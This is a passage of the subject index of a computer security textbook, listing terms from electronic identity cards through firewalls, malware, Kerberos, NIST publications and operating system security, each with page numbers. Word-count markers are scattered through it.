[Word Count: 17]

­KCK), 756
Earthquake, 537
Eavesdropping, ­104–​­105, 543
Economy of mechanism, 28
Egress monitors, 235
Electrically erasable programmable ROM (EEPROM), 92
Electrical power threat, 542
Electromagnetic interference (EMI) threat, 543
Electronic codebook (ECB) mode, 45, 48, ­655–​­656
Electronic identity (eID) card, ­93–​­96
[Word Count: 41]

functions, ­94–​­96
­human-​­readable data on, 93
Password Authenticated Connection Establishment
[Word Count: 10]

(PACE), 96
Electronic monitoring, 80
Electronic user authentication
[Word Count: 8]

means of, 75
model for, ­74–​­75
risk assessment, ­75–​­78
Elliptic curve cryptography (ECC), 60, ­688–​­689
­E-​­mail
[Word Count: 16]

attachment, infected, 214, 219
clear signed data, S/MIME, ­696–​­697
DomainKeys Identified Mail (DKIM), ­697–​­700
enveloped data, S/MIME, 694, 697
[Word Count: 19]

and Internet access policies, ­566–​­567
Multipurpose Internet Mail Extension (MIME), 694
­public-​­key certificates, 697
Secure/Multipurpose Internet Mail Extension (S/MIME), 62,
[Word Count: 20]

­694–​­697, ­699–​­700, 707, 722
security, 192
signed data, S/MIME, 694, ­696–​­697
spam, 219
Trojan horses, ­219–​­220
Employee behavior, 557
Employment agreements, 564
Employment practices and policies, ­563–​­565
Emulation control module, 232
Encapsulating Security Payload (ESP), ­710–​­712
[Word Count: 36]

transport mode, 711
tunnel mode, ­711–​­712
Encapsulation, 30
Encrypted MAC, 702
Encrypted virus, 208
Encrypting File System (EFS), 432
Encryption, 734
[Word Count: 21]

­end-​­to-​­end, ­660–​­663
research, 618
service, 193, ­467–​­468
of stored data, application of, ­66–​­67
Encryption algorithm, 638
[Word Count: 16]

­public-​­key encryption, 56
symmetric encryption, 42
End entity, 726
­End-​­of-​­line comment, 167
­End-​­to-​­end encryption, ­660–​­663
End user, 172
Enforcement rules, 452
Enroll, ­97–​­98, 106
Enrolled in the system, 97
Enterprise identity, 141
­Enterprise-​­wide access control, 142
Enveloped data, S/MIME, 694, ­696–​­697
Environmental threats, ­539–​­542
[Word Count: 44]

dust, 542
fire and smoke, ­540–​­541
inappropriate temperature and humidity, ­539–​­540
infestation, 542
prevention and mitigation measures, ­544–​­545
Environmental variables, software security, ­397–​­400
Environment attributes, 134
ePass function, 94
­Error-​­detection code, 48
eSign function, 94
ESP information, 710
Espionage, 226
/etc/syslog.conf, 592
Ethics
[Word Count: 43]

code of conduct, ­629–​­632
IEEE Code of Ethics, 631
IS professions and, ­627–​­628
issues related to computers and information systems,
[Word Count: 20]

­628–​­629
rules, 632
European Union Data Protection Directive, 622
Evaluation, 36, 45, 456, 458, ­470–​­476, ­478–​­481, 492, 495, 502,
[Word Count: 19]

516, 562
Evaluation assurance levels (EALs), ­478–​­479
[Word Count: 7]

Evaluators, 477, 480
Event, 293
Event and audit trail analysis software, tools, and
[Word Count: 13]

interfaces, 583
Event definition, 581
Event detection, 583
Event discriminator, 579
Event recording, 583
Event response, 592
Event selection, 581
Event storage, 581
Executable address space protection, ­363–​­364
Execute, 451
Execute access, 117
Execution engine, 469
Execution phase of virus, 205
[Word Count: 41]

viral structure, ­206–​­208
­Executive-​­level training, 562
execve() system function, 352
Exploits, 201
Exposure, ­19, 425, 493, 497, 501, 527, 539, 614, 626
Extended service set (ESS), 740, 743
Extensible Markup Language (XML), 292
Extreme Learning Machines (ELM), 279
[Word Count: 38]

Facilities security, 535
Factoring problem for RSA algorithms, ­682–​­683
­Fail-​­safe default, 28
Fair use, 618
False negatives, 273, 276
False positives, 273, 276
Falsification, ­20–​­21
Family Educational Rights and Privacy Act (FERPA), 15
Family, IT security requirements, 471
Fault insertion, 475
Federal Information Processing Standards (FIPS), 9, ­13–​­14,
[Word Count: 48]

25, 27, 43, 45, 50, 54, 59, 76, 87, ­548–​­551, ­643–​­645, 658, 
672, 688
PUB 46, 43
PUB 180, 54
PUB 186, 59
PUB 197 standard, 45
PUB 199 standard, ­13–​­14
PUB 200 (Minimum Security Requirements for Federal
[Word Count: 38]

Information and Information Systems), 25, 27
Federated identity standards and protocols, 140, 143, 190
Feistel cipher structure, ­641–​­643
fgets() library routine, 349
File access control, 86, ­124–​­127
File access system, 323
File infector, 208
File integrity checksums, 279
Finger, 287
fingerd daemon, 342
FIPS. See Federal Information Processing Standards (FIPS)
Firewall projects, ­767–​­768
Firewalls. See also Intrusion prevention systems (IPS)
[Word Count: 60]

activity patterns, access based on, 307
­application-​­level gateway, ­312–​­313
application protocol, 307
basing, ­314–​­317
bastion host, 315
characteristics and access policy, ­306–​­307
[Word Count: 22]

­circuit-​­level gateway or ­circuit-​­level proxy, ­313–​­314
distributed, 320
DMZ networks, ­317–​­319
­host-​­based, ­315–​­316
IP address and protocol values, 306
limitations, 307
location and configurations, ­317–​­322
need for, ­305–​­306
packet filtering, ­309–​­312
personal, ­316–​­317
scope of, 307
stateful inspection, 312
types of, ­308–​­314
users identity, access based on, 307
virtual private networks (VPN), ­319–​­320
­First-​­generation scanner, 231
Fixed database roles, 172
Fixed server roles, 172
Flash crowd, 259
Flood, 539
Flooders (DoS client), 201
Flooding attacks, ­248–​­250
[Word Count: 76]

defenses against, 261
ICMP flood, 249
TCP SYN flood, 250
UDP flood, 249
Foreign key, ­161–​­162, 170
Format, 233, 268, 279, 282, ­291–​­293, 297, 300, 351, 363, 370, 372,
[Word Count: 29]

374, 377, 386, 427, 589, ­592–​­593, 595, ­605–​­606, 618, 639, 
673, ­694–​­697, ­710–​­711, 716, ­722–​­723, ­741–​­742, ­765–​­766
Format string overflows, 370
Forward add round key transformation, 650
Forward mix column transformation, 650
Forward shift row transformation, 648
Forward substitute byte transformation, 648
­Fourth-​­generation products, 232
Fraggle program, 258
Fragmentation, 702
FreeBSD, ­82–​­83, 127
FTP, 287, 312
Fujita Tornado Intensity Scale, 538
Full virtualization, 433, 435
Functionality, 456
Functional requirements, IT security, ­25–​­27, ­471–​­473
Function call mechanisms, buffer overflow, ­343–​­344
Function returns, 343
Fuzzing, ­390–​­391
Fuzzing software tests, ­390–​­391
Fuzzy logic, 277
[Word Count: 91]

Gardner, Martin, 59
Gateways, 260, ­313–​­314, 585
General role hierarchy, 148
Generic decryption (GD) technology, ­232–​­233
Genetic algorithms, 277
getinp() function, 349
gets() function, ­339–​­340, 342, 346, ­348–​­349, 361
gets() library routine, 368
Global data area overflows, ­370–​­371
GNOME Programming Guidelines, 407
Gpcode Trojan, 221
Graceful failure, 361
GRANT command, ­169–​­170
[Word Count: 51]

Graphical user interfaces (GUIs), 606
grep program, 398
Group, 5, 59, 117, ­125–​­127, 172, 184, ­268–​­269, 277, 291, 395,
[Word Count: 19]

­399–​­401, 428, 431, 445, 466, 474, 499, 508, 512, 518, 543, 
­551–​­552, 562, 591, 602, 624, 639, 687, 697, 726, 734, 739, 
742, 746, 750
Group keys, 751, ­753–​­757, 759
Group master key (GMK), 756
Group temporal key (GTK), 756
Guard pages, 365
Guest OS, ­433–​­436
[Word Count: 46]

Hacker/cracker, 79, 85, 187, ­268–​­269, 294, 323. See also
[Word Count: 9]

Hacking projects
Hacking projects, 763
Hacktivists, 269
Handling of program input, ­380–​­391
Handshake Protocol, ­702–​­705
Hardening, ­419–​­423, 426, 428, ­430–​­432
Hardware, 18, 22, 177
[Word Count: 24]

efficiency, 660
information system, ­535–​­536
Hashed passwords, ­80–​­83
Hash functions
[Word Count: 10]

applications of, 55
collision resistant, 53
HMAC, ­675–​­679
intrusion detection and, 55
MD5 message digest algorithm, 696
message authentication and, ­47–​­55
­one-​­way, 50, ­52–​­53, 78, 82, 670, 765
preimage resistant, ­53–​­54
second preimage resistant, 53
secure, ­53–​­54
Secure Hash Algorithm (SHA), ­672–​­675
simple (SHF), ­670–​­672
Heap, 367
Heap overflow, ­367–​­370
hello function, 345, ­347–​­348
Hierarchies, RBAC, 132
High confidence, 548
High interaction honeypot, 294
HMAC, 52, ­675–​­679
[Word Count: 67]

algorithm, ­676–​­678
design objectives for, 676
security of, ­678–​­679
Honeynet Project, 294
Honeypots, ­294–​­296
[Word Count: 14]

fully internal, 296
high interaction, 294
low interaction, 294
outside the external firewall, 295
Host attacks, 105
Host audit record (HAR), 282
­Host-​­based ­behavior-​­blocking software, 233
­Host-​­based detectors, 290
­Host-​­based firewalls, ­315–​­316
­Host-​­based IDSs (HIDSs), ­231–​­232, 234, 273, 278, 281, 282, 570
[Word Count: 42]

anomaly, ­279–​­281
benefit of, 278
data sources, ­278–​­279
distributed, ­281–​­283
[Word Count: 10]

sensors, 278–279
signature or heuristic based, 281
­Host-​­based intrusion prevention systems (HIPS), ­322–​­324
Hosted virtualization, ­433–​­434, 436
Host input/output, 323
­Host-​­resident firewall, 320
HTTP flood, 253
HTTPS (HTTP over SSL), ­223–​­224, ­705–​­707
[Word Count: 32]

connection closure, ­706–​­707
connection initiation, 706
Human attack surface, 31
Human factors of computer security
[Word Count: 15]

awareness, training and education for, ­557–​­562
computer security incident response team (CSIRT), ­567–​­574
­e-​­mail use policies, ­566–​­567
employment practices and policies, ­563–​­565
Internet use policies, ­566–​­567
­Human-​­caused threats, 543
prevention and mitigation measures, ­545–​­546
Humidity, ­539–​­540
Hurricanes, 537
Hybrid cloud, 184
Hydraq Trojan, 220
Hypertext Transfer Protocol (HTTP)-based attack,
[Word Count: 49]

­253–​­254, 287
Hypervisor, ­228–​­229, 420, ­433–​­436
Hypervisor security, ­435–​­436
[Word Count: 9]

Ice storm, 538
ICMP flood attack, 249
Identification, 4, 26, 73, 94, ­96–​­98, 230, 260, 277, 472, ­499–​­501,
[Word Count: 18]

521, 527, 754
Identifier (ID), 78, 80
Identity and Access Management (IDAM) system, 146, 190
Identity, credential, and access management (ICAM)
[Word Count: 21]

access management, 142
credential management, ­141–​­142
identity federation, 143
identity management, 141
purpose of, 140
Identity federation, 143
Identity management, 141, ­620–​­621
Identity providers (IDPs), 146
Identity service provider, 146
Identity theft, ­225–​­226, 733
IDS. See Intrusion detection systems (IDS)
IEEE Code of Ethics, 631
IEEE (Institute of Electrical and Electronics Engineers) P1363
[Word Count: 53]

Standard for ­Public-​­Key Cryptography, 60
IEEE 802.11 Wireless LAN, 739
[Word Count: 10]

network components and architectural model, ­742–​­743
protocol architecture, ­740–​­742
services, ­743–​­745
IEEE 802.11i Wireless LAN
[Word Count: 15]

authentication phase, ­751–​­753
characteristics, ­745–​­746
discovery phase, ­749–​­751
key management phase, ­753–​­758
operation phases, ­746–​­749
pseudorandom function, ­758–​­760
services, 746
IEEE 802.1X, 734, ­750–​­751, 753, 755
[Word Count: 26]

IETF Public Key Infrastructure X.509 (PKIX) model, 726
Illegal/logically incorrect queries, 167
Immutable audit, 626
Imperva Web Application Attack Report, 2013, 163
Implementation plan, 487, ­516–​­517, ­524–​­525, 531
Inband attack, 166
Incapacitation, ­20–​­21
Incident, 569
Incident handling, 526, 528, ­567–​­568, ­570–​­574
[Word Count: 41]

information flow for, ­573–​­574
life cycle, 572
Incident response, 26, 191, 521, ­529–​­531, ­556–​­557, ­567–​­574
Independent BSS (IBSS), 743, 746, 751
Infected content. See Viruses
Infection vector, 205
Inference, 20, ­173–​­176
[Word Count: 31]

channel, 174
database security, ­173–​­176
detection at query time, 175
detection during database design, 175
example, 175
threat of disclosure by, 175
Inferential attack, 167
Infestation, 542
Inflexibility, 176
Informal approach, security risk assessment, 494
Information, 454
[Word Count: 37]

defined, 13n1
Information Assurance and Security (IAS), 6
Information Card Foundation (ICF), 145
Information leakage, 475
Information system (IS), 535, 578
[Word Count: 21]

security, 535
Information system hardware, ­535–​­536
Information technology (IT) security control, ­516–​­524
[Word Count: 12]

implementation of, ­525–​­526
maintenance and monitoring of implemented controls,
[Word Count: 9]

­526–​­528
Information technology (IT) security management, ­485–​­512,
[Word Count: 7]

516, ­525–​­526, 528, 573
definition, 487
implementation of, 516
ISO/IEC 27000 series of standards, 487
organizational context and security policy, ­489–​­492
overview of, 488
safeguards, 15, 492, ­516–​­524, 558, 635
Information technology (IT) security plan, ­524–​­525
[Word Count: 36]

implementation of, ­525–​­526
Information technology (IT) security risk assessment process,
[Word Count: 10]

488
baseline approach, ­493–​­494
combined baseline, informal, and detailed approach, 495
detailed, ­494–​­495
informal approach, 494
Information theft
[Word Count: 18]

credential theft, ­224–​­225
data exfiltration, 226
espionage, 226
identity theft, ­225–​­226
keyloggers, ­224–​­225
phishing, 192, 200, ­202–​­203, ­218–​­219, ­224–​­226, 271, 330,
[Word Count: 21]

reconnaissance, 226
spyware, ­224–​­225
Infrastructure as a service (IaaS), 183
Infrastructure controls, 522
Infrastructure security, 535
Infringement, intellectual property and, ­615–​­616
Ingress monitors, ­234–​­235
Injection attack, ­163–​­168, ­382–​­386
Inline sensor, 284, 297
Input fuzzing, ­390–​­391
Insecure interfaces, 187
Inside attack, 19
Institute of Electrical and Electronic Engineers (IEEE) Code
[Word Count: 49]

of Ethics, 629
Instructor Resource Center (IRC), 8
Integer overflows, 370
Integrity, 13, 15, ­22–​­23, 109. See also Authenticity; System
[Word Count: 20]

integrity
system and information, 27
Integrity Check Value, 710
Integrity confinement, 451
Integrity verification procedures (IVPs), 452
Intel digital random number generator (DRNG), 66
Intellectual property, 615
[Word Count: 27]

copyrights, 615
infringement, ­615–​­616
patents, 615, 617
relevant to network and computer security, ­617–​­618
trademark, 617
types of, ­615–​­617
U.S. Digital Millennium Copyright Act (DMCA), ­618–​­619
Interception, 20, 234, 596, 613, 623
Interface, 309
International Convention on Cybercrime, 612
International Organization for Standardization (ISO),
[Word Count: 44]

3, 10, 162, 470, ­486–​­487, 520, 558, ­563–​­565,  
­583–​­585, 623
International Telecommunication Union (ITU),
[Word Count: 14]

9, 579, 607, 722
Internet Architecture Board (IAB), 9, 707
Internet authentication
[Word Count: 12]

Kerberos, ­716–​­722
­public-​­key infrastructure (PKI), ­725–​­727
X. 509, ­722–​­725
Internet banking server (IBS), 33
Internet Engineering Task Force (IETF), 9, 726
[Word Count: 21]

Public Key Infrastructure X.509 (PKIX), ­726–​­727
Internet mail architecture, ­697–​­699
Internet Message Access Protocol (IMAP), 287
Internet protocol security, See IP security(IPsec)
Internet Relay Chat (IRC), 252, 287
[Word Count: 28]

networks, 223
Internet security protocols. See also IP security (IPsec)
[Word Count: 10]

DomainKeys Identified Mail (DKIM), ­697–​­700
HTTPS (HTTP over SSL), ­705–​­707
IPv4 and IPv6 security, ­707–​­712
Multipurpose Internet Mail Extension (MIME), 694
Secure/Multipurpose Internet Mail Extension (S/MIME),
[Word Count: 26]

­694–​­697
Secure Sockets Layer (SSL), ­701–​­705
Transport Layer Security (TLS), 701
Internet service provider (ISP), 305
[Word Count: 16]

Internet Society (ISOC), 9
Internet use policies, ­566–​­567
Interposable libraries, ­595–​­598
Interposable library function, ­597–​­598
Intruders, ­268–​­272
[Word Count: 17]

behavior, ­270–​­272, 274
classes of, ­268–​­269
cyber criminals, ­268–​­269
definition, 268
hacktivists, 269
initial access, 271
intrusion detection, ­272–​­275
maintaining access, 271
privilege escalation, 271
range of attacks, 270
skill levels, ­269–​­270
target acquisition and information gathering, 270
Intrusion, 20
Intrusion detection and prevention system (IDPS), 322
Intrusion Detection Exchange Protocol (IDXP), 292
Intrusion Detection Message Exchange Format (IDMEF), 292
Intrusion detection systems (IDS)
[Word Count: 64]

exchange format, ­291–​­293
Intrusion Detection Exchange Protocol (IDXP), 292
Intrusion Detection Message Exchange Format (IDMEF), 292
Intrusion management, ­192–​­193
Intrusion prevention systems (IPSs), 192, 270, ­322–​­326, 570
[Word Count: 27]

distributed or hybrid, ­324–​­326
­host-​­based, ­322–​­324
­network-​­based, 324
Snort Inline, 326
unified threat management (UTM), example of, ­326–​­330
Inverse add round key transformation, 651
Inverse shift row transformation, 650
Inverse substitute byte transformation, 648
INVITE request, ­252–​­253
Invocation property, 451
Invoke, 451
IP address spoofing, 311
IP destination address, 709
ipfw program, 429
IPhone Trojans, 221
IP protocol field, 309
IPS. See Intrusion prevention systems (IPSs)
IPSec platform, 319
IPsec protocol mode, 710
IP security (IPsec), 62, 408, 722
[Word Count: 79]

applications of, ­707–​­708
Authentication Header (AH), 709
benefits, 708
Encapsulating Security Payload, ­710–​­712
routing applications, ­708–​­709
scope of, 709
security association (SA), ­709–​­710
iptables program, 429
IPv4, 287, ­707–​­712
IPv6, 259, ­707–​­712
Iris biometric authentication system, 97, ­105–​­107
­Iris-​­recognition camera, 106
ISO 27002, ­557–​­558, ­563–​­565, ­584–​­585, 623
ISO/IEC 27002 Security Controls, 520
Isolation, 30, 458
Issuer name, 723
[Word Count: 58]

IT security management. See Information technology (IT)
[Word Count: 7]

security management
IT security plan. See Information technology (IT) security plan
ITU Telecommunication Standardization Sector (­ITU-​­T),
[Word Count: 16]

Internet authentication and, ­716–​­722
performance issues, 722
­ticket-​­granting service (TGS), 718
­ticket-​­granting ticket (TGT), ­718–​­720
version 4, and 5, ­721–​­722
Kerberos protocol, ­716–​­720
Kerberos server, 720
Kernel, 124, ­227–​­229, 234, 236, 345, 352, 364, ­417–​­418, 421, 429,
[Word Count: 37]

431, 458, ­599–​­600
Kernel mode, DAC, 124, ­227–​­228, 599
Kernel mode rootkits, 228
Key distribution center (KDC), 663
Key distribution, symmetric encryption, ­662–​­664
Keyed hash MAC, ­51–​­52
Key expansion, AES, 651
Key generation, 468
Keyloggers, 201, ­224–​­226
Keylogging, 223
Key management, ­60–​­64, ­66–​­67, 176, 189, 471, 707, 710,
[Word Count: 48]

­750–​­751, ­753–​­759
Key pair recovery, 727
Keys
[Word Count: 7]

group, 751, ­753–​­757, 759
pairwise, ­753–​­756
public, 56, 60, 686, 688, 725
Keystream, 47, 652
Klez ­mass-​­mailing worm, 218, 221
Known session ID, 34
[Word Count: 24]

Laboratory exercises, 764
LAN monitor agent, 283
Laptop data encryption, 67
LavaRnd, 65
Law enforcement agencies, 612
Layering, 30
Leaky system resources, 18
Least astonishment, 31
Least common mechanism, 29
Least privileges, 29, ­400–​­402, 565
Legal aspects of computer security, ­5–​­6, 14, 35, 114, 188, 244,
[Word Count: 46]

263, 294, ­489–​­491, 493, 495, 497, 508, 510, 523, 568
cybercrime and, ­611–​­615
ethical issues, ­626–​­632
intellectual property and, ­615–​­621
privacy and, ­621–​­626
Level of risk, 19, 295, ­492–​­493, 498, 501, ­504–​­505, 509, ­512–​­513,
[Word Count: 34]

­523–​­ 524, 531
Liability, 558
Libraries, 228, 322, 349
[Word Count: 9]

­anti-​­XSS, 390
dynamic, 370
dynamically linked shared, 596
dynamically loadable, 397, 399
dynamically loaded, 314
[Word Count: 15]

dynamic binary rewriting, ­598–​­600
Dynamic Link Libraries (DLLs), 279
executable, 430
interposable, ­595–​­598
safe, 362
shared, ­595–​­596
standard, 351, 360, 362, 365, 399
statically linked, 595
statically linked shared, 596
TCP wrappers, 429
­third-​­party application, 351
­Library-​­based tape encryption, 67
Library function, 342, 352, ­367–​­368, ­402–​­405, ­595–​­597, 600
Libsafe, 362
Lifecycle management, 141
Lightning, 538
Likelihood, 35, 55, 85, 203, 216, 218, 226, 325, 380, 391,
[Word Count: 66]

395, 403, ­493–​­494, 496, ­501–​­505, 507, ­509–​­512, 523,  
526, 530, 544
Limited role hierarchy, ­131–​­132, ­148​­
Link encryption, ­660–​­662
Linux/Unix security
[Word Count: 21]

access controls, ­428–​­429
application and service configuration, 427
application security using a chroot jail, ­429–​­430
logging and log rotation, 429
patch management, 427
testing, 430
troubleshooting a chrooted application, ­429–​­430
users, groups, and permissions, ­427–​­428
Literary works, copyrighted, 616
Loadable modules, 599
Local area network (LAN), 20, 109, 184, 285, 287, 305, 319
Lock, 405
Lockfile, software security, ­405–​­407
Log, 80, 85, ­101–​­102, 166, 193, 213, 272, 278, 280, ­293–​­294,
[Word Count: 70]

­296–​­298, ­312–​­313, 315, ­319–​­320, 326, 351, 400, 422, 
­425–​­426, 429, 443, 445, 453, ­466–​­467, 527, 570, 578, 
­585–​­586, ­588–​­594, 598, ­600–​­608, 626, 665, 717, 719
Log analysis, 592
[Word Count: 28]

tools, 570
Log file encryption, 592
logger, 591
Logging function, ­425–​­426, 429
[Word Count: 12]

at the application level, ­594–​­595
interposable libraries, ­595–​­598
syslog (UNIX), ­591–​­594
at the system level, ­589–​­594
Windows event log, ­589–​­591
Logical link control (LLC), ­740–​­743, 746
Logical security, 535, ­547–​­553
Logic bomb, 201, 205, ­221–​­222
Logic bomber, 205
Logon events, 591
Low interaction honeypot, 294
LulzSec, 269
[Word Count: 47]

Machine readable zone (MRZ), 93
Mac OS X secure file delete program, 404
MAC protocol data unit (MPDU), ­740–​­742, 744, 748, 750, 752,
[Word Count: 23]

756, 758, ­761–​­762
Macro virus, 201, 206, ­208–​­210
MAC service data unit (MSDU), ­740–​­742, 744
[Word Count: 15]

Mail delivery agent (MDA), 699
Mail submission agent (MSA), ­698–​­699
main() function, 349
main() routine, 368
Maintenance hook, 226
Maintenance of information systems, 26
Maintenance of security controls, 527
Malicious insiders, ­187–​­188
Malicious software (malware), 281. See also Viruses; Worms
[Word Count: 40]

attack kits, ­202–​­203
attack sources, 203
backdoor (trapdoor), ­20–​­21, 201, ­214–​­215, ­226–​­227, 272, 330
bots, ­222–​­224, 235, ­253–​­254, 318, 632
broad categories, 200
countermeasures for, ­229–​­235
definition, 200
logic bomb, 201, 205, ­221–​­222
mobile code, 201, 214, ­216–​­217
rootkits, 201, ­226–​­229, 234
spreading of new, 223
terminologies for, 201
Trojan horse, 21, ­104–​­105, 201, 215, 217, ­219–​­220, 227, 268,
[Word Count: 59]

322, 452, ­458–​­459
types, ­200–​­203
malloc() function, 364, 368
Malvertising, 218
Malware. See Malicious software (malware)
Management, 293, ­501–​­503, ­506–​­507, ­510–​­511
[Word Count: 21]

access, 142
account, 591
change, ­527–​­528
configuration, 22, 26, 28, 473, 478, 528
content, 621
controls, 25, 35, 517, ­519–​­522
credential, ­141–​­142
of data, 364, 368, 370
database, 116, 118, ­157–​­159, 166, 168, 477
Digital Rights Management (DRM), ­619–​­621
identity, 141, 620
identity and access management (IAM), 190
intrusion, ­192–​­193
IT security, ­485–​­512, ­516–​­517, ­524–​­526, 528, 573
key, ­60–​­64, ­66–​­67, 176, 189, 471, 707, 710, ­750–​­751, ­753–​­759
memory, 364, 368, 370, 395, 449
network, 185, 284, 734
patch, 427, 430
rights, 621
risk, ­492–​­493, 498, 508, 512
security information and event management (SIEM), 193,
[Word Count: 94]

291, ­604–​­605
subsystem, 548
trusted facility, 478
­Management-​­level training, 562
Manager, 293
Mandatory access control (MAC), 4, 116, 169, 422, 440,
[Word Count: 21]

442, 449
­Man-​­in-​­the-​­middle-​­attack, 688, 733
Manning, Chelsea, 269
Manual defensive coding practices, 168
Markov modeling techniques, 84
Markov models, 277
Markov process model, 84, 277, 279
Masquerade, security threats by, ­20–​­21, 24
[Word Count: 32]

Master, ­269–​­270
Master session key (MSK), 753
MD5, 54, ­82–​­83, ­678–​­679, 696, ­724–​­725, 747, 756
MD5 crypt, ­82–​­83
Measured service, 182
Medium access control (MAC), 521, 603, ­741–​­742, 746
Melissa ­e-​­mail worm, 214
Memory allocator, 370
Memory cards, ­90–​­91
Memory leak, ­395–​­396
Memory management unit (MMU), ­364–​­365
Message confidentiality, symmetric encryption and, ­637–​­664
Message/data authentication, ­47–​­52
[Word Count: 56]

code (MAC), ­49–​­51, 702
as a complex function of message and key, 49
­Diffie–​­Hellman key exchange/key agreement, 59, 63,
[Word Count: 19]

­684–​­688
hash functions and, ­47–​­55
HMAC, 52, ­675–​­679
RSA algorithm, ­679–​­684
using a message authentication code (MAC), ­49–​­50
using a ­one-​­way hash function, ­50–​­52
using ­public-​­key encryption, 50, 52. See also ­Public-​­key
[Word Count: 32]

encryption/cryptosystem
using secret key, ­51–​­52
using symmetric encryption, 48
without confidentiality, ­48–​­49
without message encryption, ­48–​­52
Message digest, 50, 54, ­672–​­673, 675, 689, 694, 696, 758
Message integrity, 702, 758
Message integrity code (MIC), 746, ­755–​­756, 758
Message store (MS), 699
Message transfer agent (MTA), 699
Message user agent (MUA), 698
Metamorphic virus, 209
Metamorphic worms, 216
Michael, 747, 755, 758
Miller, Barton, 391
MIME, ­694–​­695
Minimal effect on functionality, 583
Misappropriation, ­20–​­21
Misuse, ­20–​­21, ­156–​­157, 275, ­472–​­473, 520, 536, 543, 546, 563,
[Word Count: 83]

607, 613, 624, 627, 724
Mix Columns, 646
Mix column transformation, AES, 650
Mixter, 251
MLS. See Multilevel security (MLS)
Mobile code, 201, 214, ­216–​­217
Mobile device security, ­735–​­739
Mobile phone Trojans, ­220–​­221
Mobile phone worms, 217
Mobility, 732
Mode, 28, ­45–​­46, 48, 56, 120, 124, 130, 205, 213, ­227–​­229, 285,
[Word Count: 51]

297, 307, 317, 438, 442, 444, 449, 451, 569, 586, 596, 599, 
­655–​­660, 671, ­710–​­712, 747, 758
Model, ­17–​­19, 29, 42, ­74–​­75, 84, 116, ­120–​­124, ­130–​­131,
[Word Count: 26]

­133–​­134, ­136–​­139, ­145–​­147, ­160–​­161, 168, 179, ­181–​­182, 
­185–​­187, 189, ­212–​­213, ­276–​­277, ­292–​­293, 308, 312, 376, 
378, 392, 396, 409, 431, ­440–​­456, 479, 489, 525, 549, 
­552–​­553, 558, ­579–​­581, ­619–​­620, 638, 699, 701, ­725–​­727, 
740, ­742–​­743
Modes of operation, 46
[Word Count: 39]

Modification of messages, 24
Modification right, 616
Modify, 451
Modularity, 30
Monitoring, Analysis, and Response System (MARS), ­606–​­607
Monitoring risks, ­526–​­528
Morris, Robert, 213
Morris worm, 213, 342, 349
Motion pictures, copyrighted, 616
Motivation, 500
MPDU exchange, 752
Multics, 449
­Multi-​­instance model of data protection, 189
Multilevel security (MLS), 442, 459
[Word Count: 51]

­Bell–​­LaPadula model for computer security, ­440–​­450
Biba integrity model of computer security, ­451–​­452
Chinese wall model, ­454–​­456
­Clark–​­Wilson model (CWM) of computer security, ­452–​­453
database security and, ­461–​­466
for information technology security evaluation, ­470–​­476
RFC 2828 definition, 459
for ­role-​­based access control (RBAC) system, ­460–​­461
trusted computing (TC), 466
Multipartite virus, 208
Multiple encodings, 389
Multiple password use, ­79–​­80
Multipurpose Internet Mail Extension (MIME), ­694–​­697
­Multi-​­tenant model of data protection, 189
Multivariate model, 276
Musical works, copyrighted, 616
Mutation engine, 209
Mutually exclusive roles, RBAC, ­132–​­133
Mydoom, 215
[Word Count: 88]

National ID cards, 93
National Institute of Standards and Technology (NIST), 9, 29,
[Word Count: 13]

37, 43, 54, 59, 110, 128, 412, ­512–​­513, 532, 554, 608, 643, 
672, 688
buffer overflow, 338
Computer Security Handbook (NIST95), 12, 36, 476
deployment models, ­183–​­185
guidelines on cloud security and privacy issues and recom-
[Word Count: 36]

mendations, 191
IR 7298, Glossary of Key Information Security Terms, 114
IT security management, definition, 487
program of standardizing encryption and hash algorithms, 29
Security Requirements for Cryptographic Modules (FIPS
[Word Count: 30]

PUB ­140-​­3), 128
service models, ­182–​­183
SP ­80-​­63-​­2 (Electronic Authentication Guideline), 74
SP ­500-​­292 (Cloud Computing Reference Architecture), 185
SP ­800-​­16 (Information Technology Security Training Re-
[Word Count: 26]

quirements A ­Role-​­ and ­Performance-​­Based Model), 558
SP ­800-​­61 (computer security incident response team
[Word Count: 14]

(CSIRT)), 568, ­571–​­572
SP ­800-​­100 (Security awareness, training, and education
[Word Count: 10]

programs), 557
­SP-​­800-​­145 (Definition of Cloud Computing), 181, 189
­SP800-​­53 Security Controls, 519, ­521–​­522
­SP800-​­116 principles, ­551–​­552
standard FIPS 199 (Standards for Security Categorization of
[Word Count: 25]

Federal Information and Information Systems), 13
National Security Agency (NSA), 5, 27, 37, 458, 470, 638
[Word Count: 16]

Native virtualization systems, 433
Natural disasters, as threats to physical security, ­536–​­539
n ­b-​­bit blocks of ciphertext, 45
Nessus, 430
netfilter kernel module, 429
Network attack surface, 31
­Network-​­based IDS (NIDS), 273, ­283–​­289, 570
[Word Count: 34]

application layer reconnaissance and attacks, 287
deployment of network sensors, ­285–​­287
logging of alerts, ­288–​­289
network layer reconnaissance and attacks, 287
network sensors, 284
policy violations, 287
signature detection, 287
transport layer reconnaissance and attacks, 287
unexpected application services, 287
­Network-​­based IPS (NIPS), 324
Network File System (NFS), 287
Network injection attack, 734
Network interface card (NIC), 284, 434
Network layer address spoofing, 311
Network security, 193
[Word Count: 67]

attacks, ­24–​­25
Network sensors, 284
Neuer Personalausweis, 93
Neural networks, 277
Never Before Seen (NBS) Anomaly Detection Driver, 603
Next Header, 710
NIST. See National Institute of Standards and Technology
­No-​­execute bit, 364
­No-​­execute protection, 364
Noise as a physical interference, ­542–​­543
Nonexecutable memory, 364
Nonrepudiation, ­13–​­14, 16, 472, 521, 585
Nontraditional networks, 733
Nonvolatile memory, 469
NOP sled, ­356–​­357, 364, 366, 368
Notification, 293
NULL terminator, ­340–​­341
[Word Count: 68]

Object access, 591
Object attributes, 134
Objects of access control, 117
Observe, 451
Obstruction, ­20–​­21, 29
­Off-​­by-​­one attacks, 366
Offline dictionary attack, 79
­On-​­demand ­self-​­service, 182
­One-​­way hash function, ­50–​­53, 78, 82, 670, 765
[Word Count: 34]

of password, 78
­One-​­way/preimage resistant, 53
Online Certificate Status Protocol (OCSP), 724
Online polls/games, 223
Open access control policy, ­115–​­116
OpenBSD system, 83, 360, 362, 365
Open design, 29
Open Identity Exchange (OIX) Corporation, 145
Open identity trust framework (OITF), ­145–​­147
OpenID Foundation, 145
OpenID identity providers, 145
Open recursive DNS servers, 259
Open Shortest Path First (OSPF), 709
Open systems interconnection (OSI), 311, 701
[Word Count: 65]

Open Web Application Security Project’s 2013 report, 163
Open Web Application Security Project Top Ten, ­376–​­377
Operating ­system-​­based security mechanisms, 158
Operating system (OS)
[Word Count: 24]

environmental variables, ­397–​­400
